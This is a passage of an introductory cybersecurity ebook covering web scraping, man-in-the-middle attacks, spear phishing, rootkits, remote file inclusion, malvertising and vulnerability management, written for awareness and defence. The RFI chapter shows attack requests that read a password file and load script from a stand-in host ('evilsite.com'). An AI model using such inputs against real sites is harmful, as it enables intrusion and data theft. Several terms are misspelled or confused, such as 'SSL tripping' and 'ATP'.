+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is where bots</span> are used to extract data and content from websites. It is different from screen scraping in that, instead of copying pixels on the screen, it extracts the underlying HTML code along with the data in a database. Next, this scrapper may replicate this website content somewhere else. There are different types of digital businesses that depend on data harvesting and they use web scraping for that. Some legitimate uses include: When search engine bots crawl a site to analyze its content for the purpose of ranking. Sites that compare prices deploy bots to fetch product descriptions and prices for seller websites. Market research organizations may use scrapers to fetch data from social media and forums. Web scraping can be used by perpetrators to carry out illegal reasons like stealing copyrighted content and undercutting prices. The results of such an action can have severe repercussions for an online entity such as financial losses— it is even worse if the business is a content distributor or depends on competitive pricing models. Scraper Tools and Models are software designed to maneuver through databases and fetch data. Different types of bots are used. They are customized to:</p>
+<div class="poetry">
+<p>●  Identify one-of-a-kind HTML site structures</p>
+<p>●  Store the scraped data</p>
+<p>●  Extract API information</p>
+<p>●  Extract and change content</p>
+</div>
+<p>All types of scraping bots are meant to access data from sites, so it is not easy to tell the malicious ones from the legitimate ones. However, there are two major differences that may help to differentiate the two: If a bot is legitimate, it is identified with the company that uses it. Take the example of a Googlebot. In the HTTP header, it identifies itself with Google. Suspicious bots impersonate real traffic and create a fake HTTP user agent. Bots from legitimate organizations abide the robot.txt file of a site, which has a list of all pages that the bot can access and those that it is not. Malicious bots crawl a website with no regard for whatever is allowed. There are so many resources required to run web scraping bots. When an attacker cannot afford these resources, he opts for a botnet.</p>
+<p>Malicious Web Scraping Examples</p>
+<p>Web scraping is malicious when it is done without a website owner’s permission. The most common cases include content theft and price scraping.</p>
+<p>Price Scraping</p>
+<p>In this case, an attacker uses a botnet to send scraper bots to survey databases of competing businesses with the goal of boosting sales, undercutting rivals and accessing pricing information. These attacks are common in industries where price has a huge effect on purchasing decisions. Content Scraping involves the stealing of large amounts of content from a certain site. Websites that depend on digital content and online product catalogues are the most targeted.</p>
+<p>Web Scraping Protection</p>
+<p>Most measures have become ineffective due to the advancement of scraper bots. Granular traffic analysis is one of the best methods for countering bot operations. It is characterized by cross verification of factors such as:</p>
+<div class="poetry">
+<p>●  HTML fingerprint</p>
+<p>●  IP reputation</p>
+<p>●  Behavior analysis</p>
+<p>●  Progressive challenges</p>
+</div>
+<p><span id="c029.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 25</h1>
+<h1>Man in the Middle (MITM) Attack</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is a general term</span> that refers to the act of an attacker intercepting conversations between an application and a user. He can masquerade as one of the parties or eavesdrop making it seem as though the conversation is normal. The aim of a MITM is to steal credit card numbers, account details, login credentials, and other sensitive information. Attackers typically target users of e-commerce sites, SaaS businesses, financial applications, and other sites that require logging in.  The information that a perpetrator gathers in an attack like this one can be used for all kinds of purposes such as unauthorized password changes, illicit fund transfers, and identity theft. Moreover, the attacker can use it to attain a foothold in a secured network in the infiltration stage of an ATP (advanced persistent threat). To have a better understanding of a MITM attack, think of a mailman accessing your bank statements, taking your details, and delivering the envelope to you after resealing it. There are two distinct phases of a successful MITM attack: interception and decryption. In this first step, the attacker uses his network to intercept user traffic before it gets to the intended destination. The simplest and most common way of accomplishing this is by making free Wi-Fi hotspots that are malicious. He makes them available to the general public. These hotspots are not usually protected by passwords. When a user connects their device to this network, the perpetrator can access their online data exchange. Some attackers may prefer to take an active approach via the following methods: IP spoofing: a perpetrator changes IP address packet headers and masquerades as an application. Any user that tries to access the application’s URL gets redirected to the website of the attacker. ARP spoofing: an attacker uses fake ARP messages to link a legitimate user’s IP address with his MAC address. Once this happens, data that is supposed to go to the host IP address from the user goes to the attacker. DNS spoofing: this is where a DNS server is infiltrated, and the address record of the website changed. Once the interception step is successful, a two-way SSL traffic must be decrypted discreetly without the knowledge of the application or the user. There are several ways of accomplishing this: HTTPS spoofing: a phony certificate is sent to the browser of the victim after the first successful connection to a secure site. SSL BEAST: malicious JavaScript is injected into the user’s computer making it possible to intercept any encrypted cookies sent from a web application. SSL hijacking: in a TCP handshake, the perpetrator passes a fake authentication key to the application and the user. SSL tripping: where HTTPS connections are downgraded to HTTP.</p>
+<p>Man in the Middle Attack Prevention</p>
+<p>For users:</p>
+<div class="poetry">
+<p>●  Avoid suspicious Wi-Fi connections</p>
+<p>●  Heed browser warnings about unsecured websites</p>
+<p>●  Always log out of apps</p>
+<p>●  Avoid public networks</p>
+</div>
+<p>Website operators should reinforce secure communication protocols by ensuring the encryption and authentication of transmitted data.</p>
+<p><span id="c030.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 26</h1>
+<h1>Spear Phishing</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is a form of social</span> engineering attack where an attacker pretends to be a trusted individual and tricks the victim into clicking a malicious link in a text message or spoofed email. The user then unsuspectingly installs malware on their computer/network, carries out the first stage of an ATP, or gives out sensitive information, among other consequences. Although spear phishing appears like whaling attacks and phishing, it is a little different from typical social engineering attacks and is executed in an unusual way. Due to this, you need to give it special attention when creating a security strategy. Here is an example of a spear phishing attack and consequences. A person who claims to represent a database management SaaS provider, www.itservices.com, sends a spoofed email to the sysadmin of an enterprise. The mailing template he uses is that of itservices.com.  The email says that there is a new service being offered by itservices.com for a limited amount of time. It goes on to invite users to use the enclosed link and sign up. Once the sysadmin clicks on the link, they are taken to a login page on a website, itservice.com. It looks so much like the registration page of itservices.com.  Currently, the perpetrator installs a control and command agent on the computer of the sysadmin. From there, he can use it as a backdoor into the network of the enterprise and can carry out stage one of an APT.</p>
+<p>Phishing and Whaling Attacks Vs. Spear Phishing</p>
+<p>Whaling attacks, phishing, and spear phishing are different in terms of the victims they target and their sophistication levels. In a phishing attack, the perpetrator sends a malicious email pretending to be a trusted party to as many users as possible. For instance, an attacker may send out an email that appears to be from PayPal. The email asks the user to click on the enclosed link and verify their credentials. This may lead to malware being installed on the recipient’s computer. Phishing emails are not usually personal, they contain mistakes such as spelling errors and are sent in bulk. Many people never see these hints. Spear phishing emails are not easy to detect. They look like they are from someone close to the target and the emails themselves are personalized. Whaling targets decision makers in high levels of an organization. These executives have access to very sensitive information such as passwords to admin accounts, trade secrets, etc. The perpetrator sends an email pretending to be an organization or individual, such as a client. Whaling attacks target specific individuals using information sourced from the press, websites, or social media. While whaling attacks target high-level individuals, spear phishing attacks go for low profile targets.</p>
+<p>Spear Phishing Mitigation</p>
+<p>Two-factor authentication: users are required to go through two layers/steps of verification.</p>
+<p>Password management policies: this policy will ensure that employees do not use corporate passwords on malicious websites. Educational campaigns: train employees and raise awareness.</p>
+<p><span id="c031.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 27</h1>
+<h1>Rootkit</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is a malicious</span> software program that allows privileged access to a PC discreetly. It can risk your personal information and affect your computer’s performance. Once a rootkit has been installed, it boots while the operating system is booting or a few moments after. Some rootkit types boot before the operating system.  A rootkit may have many consequences including: Concealed malware: attackers can install other types of malware on already infected computers. The malicious programs are hidden from anti-virus software and the user. Information theft: perpetrators can use rootkits to steal credit card information, login credentials, and other sensitive information. File deletion: a rootkit can erase files and operating system code from a system. Eavesdropping: using a rootkit, a hacker can eavesdrop and intercept personal information. File execution: attackers can execute files remotely on target computers. Remote access: rootkits may change the configuration settings on a system such as tweaking startup scripts.</p>
+<p>Rootkit Injection</p>
+<p>A rootkit can be installed on a system through several ways.</p>
+<p>Piggybacking</p>
+<p>Sometimes, rootkits are embedded in trustworthy software and users install them unknowingly. When the software is granted administrator permission to install on the system, the rootkit also installs discreetly.</p>
+<p>Blended Threat</p>
+<p>Rootkits do not have the ability to infect computers on their own. Perpetrators may create blended threats to take advantage of various susceptibilities and compromise a system. In many cases, this is accomplished by merging the rootkit with a loader and a dropper. Dropper: this is a file or program that the hacker uses to install a rootkit on the victim’s computer. There are multiple methods of distributing a dropper including through a brute force attack or a social engineering attack. Loader: once the dropper program is initiated by the user (by executing or opening a file), a malicious code (what is known as a loader) launches. Rootkits come in multiple types including: Application or user-mode rootkit: these ones function at the application layer. They can change API and application behavior. Application rootkits can be easily detected since antivirus programs operate at the same layer. Kernel-mode: they are deployed within the kernel module of an operating system. Here, they can control all kinds of system processes. It is difficult to detect them. Bootkits: these ones take over the target system by infecting the MBR (master boot record). They enable malware to open before the operating system loads. Firmware rootkits: they infiltrate the system running a device such as system BIOS, hard drives, network cards, and routers. Rootkit hypervisors: they take over a machine by exploiting hardware virtualization features.</p>
+<p>Anti-Rootkit Measures</p>
+<p>To protect your system from rootkits, you need to scan for any existing malware in addition to preventing any new programs from being installed. Rootkit scanners: these are programs that parse a system to remove active rootkits. These scanners may not help much with some rootkits and you should combine several scanners. Preemptive blocking: this involves training users in your organizations to avoid opening or downloading files from suspicious sources.</p>
+<p><span id="c032.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 28</h1>
+<h1>Remote File Inclusion (RFI)</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-r">R</span>FI (remote file inclusion</span>) is an attack that targets susceptibilities in web applications that reference external scripts dynamically. The goal of the attacker is to take advantage of an application’s referencing function to upload malware from a remote URL in a different domain. A successful RFI attacker can result in a site takeover, compromised servers, or information theft. LFI (local file inclusion) is like RFI. It is the uploading of infected files to servers through web browsers. Most of the time, these two are referenced together. Both allow for malware to be uploaded to a targeted server. The only difference is that LFI attacks take advantage of insecure functions in a local file upload. This allows for malicious attacks. Attackers are then able to upload malware directly to the compromised system instead of accessing it from a remote location through a compromised external referencing function (as in an RFI).</p>
+<p>Example of Remote File Inclusion</p>
+<p>To understand how an RFI penetration is executed, consider the following examples: A JSP with this code line: &lt;jsp:include page=”&lt;%=(String)request.getParmeter(“ParamName”)%&gt;”&gt; is manipulated using the following request: Page1.jsp?ParamName=/WEB-INF/DB/password. When this request is processed, the perpetrator can see the password content file. A web application with an import statement requesting URL content: &lt;c:import url=”&lt;=request.getParameter(“conf”)%&gt;”&gt;.</p>
+<p>If this statement is unsanitized, it can be used to inject malware.</p>
+<p>For instance: Page2.jsp?conf=https://evilsite.com/attack.js. Manipulation of request parameters making them refer to a remote file is also a method used to launch RFI attacks. </p>
+<p>DIY Prevention and Mitigation of RFI</p>
+<p>Using proper sanitization and input validation, you can reduce the risks of an RFI attack.  When you choose to do this, however, you must bear in mind the fact that you cannot sanitize all user inputs completely. Because of this, you should use sanitization as a supplement to a better security solution. With that out of the way, it is always advisable to sanitize controlled/user-supplied inputs as thoroughly as possible. The inputs include:</p>
+<div class="poetry">
+<p>●  HTTP header values</p>
+<p>●  Cookie values</p>
+<p>●  URL parameters</p>
+<p>●  GET/POST parameters</p>
+</div>
+<p>During the sanitization process, check input fields against a whitelist— the allowed set of characters— as opposed to a blacklist— malicious characters that are disallowed. Basically, blacklist validation is not a strong solution. A perpetrator can decide to give input in another format such as hexadecimal or encoded formats. Another great practice involves applying output validation mechanisms on the server end. Validation functions on the client side are also not immune to proxy tools attacks since they have the advantage of mitigating processing overhead. Lastly, restrict the permission of executing upload directories. Also, consider having a whitelist of the allowed types of files, for example, JPG, DOC, PDF, etc. and restrict the size of uploaded files. Proper file management and input sanitization practices are not enough when used on their own. Most attacks still happen because DIY practices encourage a false sense of security. Find other efficient solutions such as the Imperva WAF (Web Application Firewall).</p>
+<p><span id="c033.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 29</h1>
+<h1>Malvertising</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is when an attacker</span> inserts malicious code into online advertising networks. This code then sends users to fraudulent websites. This attack gives hackers an opportunity to target users of reputable websites such as The London Stock Exchange, The Atlantic, The New York Times Online, and Spotify. The ecosystem of online advertising is a very complex network. It involves content delivery networks (CDNs), retargeting networks, ad servers, ad exchanges, and publisher sites. When an internet user clicks on a certain ad, several redirections between various servers occur. A perpetrator takes advantage of this complexity and places his malware in places that ad networks and publishers would not suspect. People often confuse malvertising with adware or ad malware. Adware is a program that runs on the computer of the user. In most cases, it is embedded in legitimate software and the user installs it unsuspectingly. It mines the user’s data for the purpose of targeting advertisements, brings up unwanted ads, and redirects the user’s search requests to other advertising websites. Ad malware and malvertising are different in several ways: Adware targets individual users while the malicious code in malvertising is deployed to the web page of an advertiser. The only people affected by malvertising are those who visit the infected web page while adware continues to operate on the infected computer.</p>
+<p>Effects of Malvertisements on Web Users</p>
+<p>When a user views a malvertisement without necessarily clicking on it, the following may happen: Drive-by download— adware or malware is installed on the user’s computer. Browser vulnerabilities make such attacks possible. The browser is forced to redirect to a malicious site. Malicious content, unwanted advertisements, or popups can be displayed. When a user clicks on the malicious ad, the following can happen: They may execute a code which installs adware or malware into their computer. The user may be redirected to a malicious site instead of the one that the ad suggested. The user may be redirected to a malicious site where the attacker carries out a phishing attack.</p>
+<p>Effects of Malvertisements to Publishers</p>
+<p>Publishers will suffer loss of revenues and traffic in addition to a damaged reputation. They may also incur legal liabilities due to the damages that users suffer. It is difficult for publishers to block or even test for malicious ads.</p>
+<p>How Malware Is Injected into Ads</p>
+<div class="poetry">
+<p>●  Malware in ad calls</p>
+<p>●  Malware injected post-click</p>
+<p>●  Malware in ad creative</p>
+<p>●  Malware within a pixel</p>
+<p>●  Malware within video</p>
+<p>●  Malware within Flash video</p>
+<p>●  Malware on a landing page</p>
+</div>
+<p>Mitigation and Prevention of Malvertising</p>
+<p>It is not easy to mitigate or prevent malvertising so both publishers and end users must take action.</p>
+<p>For End-Users</p>
+<div class="blockquote">
+<p>●  Install antivirus to protect your PC against malicious code and drive-by downloads.</p>
+<p>●  Make good use of ad blockers.</p>
+<p>●  Avoid using Java and the Flash.</p>
+<p>●  Update plugins and browsers.</p>
+</div>
+<p>For Publishers</p>
+<div class="blockquote">
+<p>●  Vet ad networks carefully and be inquisitive about the oaths of ad delivery.</p>
+<p>●  Scan display ads.</p>
+<p>●  Maybe only show certain types of files in an ad frame.</p>
+</div>
+<p><span id="c034.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 30</h1>
+<h1>Vulnerability Assessment</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is the process</span> of reviewing security weaknesses systematically in an information system. The system is evaluated to see if there are any vulnerabilities and the severity level of the vulnerabilities. A mitigation or remediation is then recommended if needed.  A vulnerability assessment can help prevent several threats including:</p>
+<div class="blockquote">
+<p>●  Insecure defaults: this is software that comes with insecure settings, for instance, a guessable admin password.</p>
+<p>●  XSS, SQL injection and similar attacks</p>
+<p>●  Escalation of privileges</p>
+</div>
+<p>Vulnerability assessments come in different types such as: Host assessment: this is where critical servers are assessed. If they are not tested adequately, they become vulnerable to attacks. Network and wireless assessment: practices and policies are assessed to block any unauthorized access to public or private networks and resources accessible through the network. Database assessment: big data systems and databases are assessed for misconfigurations and vulnerabilities for the purpose of identifying insecure dev/test environments or rogue databases and classifying sensitive information in an organization. Application scans: security vulnerabilities are identified in web applications and automated scans used to source their code on the front-end.</p>
+<p>Vulnerability Assessment: The Process of Security Scanning</p>
+<p>There are four steps involved in this process.</p>
+<p>Vulnerability Identification (Testing)</p>
+<p>The purpose of this step is to come up with a comprehensive list of the vulnerabilities of an application. Analysts check the security health status of an application and any other systems. They either use automated tools to scan or do it manually. These analysts also depend on threat intelligence feeds, asset management systems, vendor vulnerability announcements and vulnerability databases to find security weaknesses.</p>
+<p>Vulnerability Analysis</p>
+<p>This step seeks to find out the root cause and the source of the vulnerabilities uncovered in the step above. System components that led to the vulnerabilities are identified. For instance, a vulnerability could have resulted from an open source library’s old version. With this finding, it is easy to patch up the vulnerability.</p>
+<p>Risk Assessment</p>
+<p>The purpose of this step is to prioritize vulnerabilities. Security analysts assign a severity score or rank to each susceptibility. Here are the factors they consider:</p>
+<p>Potential damage that could result from the vulnerability</p>
+<div class="poetry">
+<p>●  The severity of an attack</p>
+<p>●  Ease of compromise or attack</p>
+<p>●  The business functions that are at risk</p>
+<p>●  The data at risk</p>
+<p>●  The systems that are affected</p>
+</div>
+<p>Remediation</p>
+<p>In this step, all the security gaps are closed. It is a joint effort by development and operation teams and security staff. They determine the best approach for mitigation or remediation of each vulnerability.</p>
+<p>Specific steps of remediation include:</p>
+<div class="poetry">
+<p>●  Introducing new security tools, measures and procedures.</p>
+<p>●  Updating configuration or operation changes.</p>
+<p>●  Developing and implementing vulnerability patches.</p>
+</div>
+<p>Vulnerability assessment is not a one-time activity.</p>
+<p>Vulnerability Assessment Tools</p>
+<p>These tools are meant to scan for existing and new threats targeting your application. They include: Web application scanners: they scan for and simulate attack patterns. Protocol scanners: they look for vulnerable network services, ports and protocols. Network scanners: they identify warning signals such as suspicious packet generation, spoofed packets, and stray IP addresses.</p>
+<p><span id="c035.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 31</h1>
+<h1>Zero-Day Exploit</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>his is a cyber-attack</span> that targets a software’s vulnerability— one that is unknown to antivirus vendors or the software vendor. The perpetrator scans the software for a vulnerability before anyone else does, comes up with an attack plan and then uses it to infiltrate the software. These attacks usually have a high chance of success because there are no defenses in place. Zero-day attacks should, therefore, be taken seriously. Common targets include certain file types (Flash, PDF, Excel, or Word), web browsers and email attachments.</p>
+<p>Typical targets:</p>
+<div class="poetry">
+<p>●  Internet of Things (IoT), firmware and hardware devices</p>
+<p>●  Home users with a vulnerable system</p>
+<p>●  People with access to sensitive business information</p>
+<p>●  Large enterprises</p>
+<p>●  Government departments</p>
+</div>
+<p>Zero-Day Attacks Examples</p>
+<p>Stuxnet: this was a worm that targeted PCs used in the manufacturing process. The countries that were most affected include Indonesia, India and Iran. Iran’s uranium enrichment plants were the key target. The intention was to disrupt the nuclear program of the country. Sony zero-day attack: a zero-day attack was carried out against Sony Pictures in 2014. This attack crippled their network and sensitive corporate information was shared. The information included executives’ personal email addresses, business plans and forthcoming movies. The exact details of the vulnerability that was exploited are still unknown. RSA: RSA, a security company, had their network accessed by hackers in 2011. The bad actors used an unpatched susceptibility in Adobe Flash Player. RSA employees received emails from the attackers. These emails had Excel spreadsheet attachments with a Flash file embedded. When employees opened it, Poison Ivy got installed on their system. Operation Aurora: this attack took place in 2009 and targeted major companies’ intellectual properties. These companies included Dow Chemical, Yahoo, Adobe Systems and Google. The vulnerabilities were in Perforce and Internet Explorer.  Zero-day exploits target vulnerabilities that have no antivirus or patches yet, so they are not easy to detect. You can, however, detect software vulnerabilities that were previously unknown in several ways: Vulnerability scanning: several zero-day exploits can be detected with vulnerability scanning. Companies that offer vulnerability scanning services simulate attacks to identify any new vulnerabilities. This approach is not suitable for all zero-day exploits. Patch management: this involves patching software vulnerabilities as soon as they are discovered. This will not necessarily prevent zero-day attacks, but it can reduce the chances of an attack happening. The problem with this is that it takes time for vulnerabilities to be discovered and antivirus software to be developed and distributed. If the process takes long, an attack could occur. Input validation and sanitization: this method is very effective (probably the best). It involves deploying a WAF (web application firewall) on the edge of the network. This WAF will review all the traffic coming in and filter out whatever malicious outputs may be there. Zero-day initiative: this is a program that rewards security researchers who disclose vulnerabilities responsibly as opposed to selling this information to bad actors.</p>
+<p><span id="c036.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 32</h1>
+<h1>Vulnerability Management</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-w">W</span>hat Is Vulnerability</span> Management? Vulnerability: a weakness in an application that can be exploited. Vulnerabilities are used to execute attacks which may lead to server takeovers, malware injection, data theft, among other repercussions. Vulnerability management involves rooting out and removing these susceptibilities before bad actors abuse them. The following methods are used to achieve that: Vulnerability scanning: sanitizing code environments using code review and pen testing. It is usually performed after an application has been updated. Patch management: patches for new vulnerabilities are deployed in third-party software that is used by your application. Input validation/sanitization: incoming traffic is verified and filtered using a WAF. Consequently, attacks are blocked even before they take advantage of the vulnerabilities. It is a great alternative to sanitizing the application code. In vulnerability scanning, a hardware-based scanner or software is used to identify soft spots in the code that an attacker can exploit. Soft spots are usually brought on by unsensitized code. Scans are carried out using code reviews and pen tests to reveal weak spots in an application and then code updates are done to eliminate these vulnerabilities. Another rescan is done to make sure that the vulnerabilities are not there. This process should be undertaken every time the code updates and whenever new attack vectors have been discovered. Generally, vulnerability scanning has several operational issues. First, new vulnerabilities are always popping up. For this reason, scanning is a frequent process that requires a lot of resources. Even then, it is hard to achieve total code sanitization since the body code is in a state of continual change. On top of that, you cannot predict all attack scenarios. Finally, vulnerability scanning does not offer a quick solution to newly discovered threats. This matters a lot because many exploits are executed as soon as new vulnerabilities are announced. The time it takes to respond to these threats is crucial in any strategy of vulnerability management. A third-party must come up with patches and test them. Your DevOps and security teams are then responsible for putting these patches in your system. Patching delays occur often usually because of: The time your security team takes to deploy the patch and check its implementation. The ability of your software creator to design and test new patches. How long it takes for your team to receive a threat notification. Input Validation/Sanitization is the process of placing a WAF on your network edge. It reviews the incoming traffic and filters out any malicious input. Input validation solves patch management and vulnerability scanning issues effectively for these reasons: It does not require code updates: the patching and scanning processes are not very effective because they depend on code updates which are prone to delay. It is handled by security experts: some WAF providers offer the solution as a managed service. It has customizable security rules. Virtual patch management: this allows for effective mitigation of immediate threats.</p>
+<p><span id="c037.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 33</h1>
+<h1>Web Application Security</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
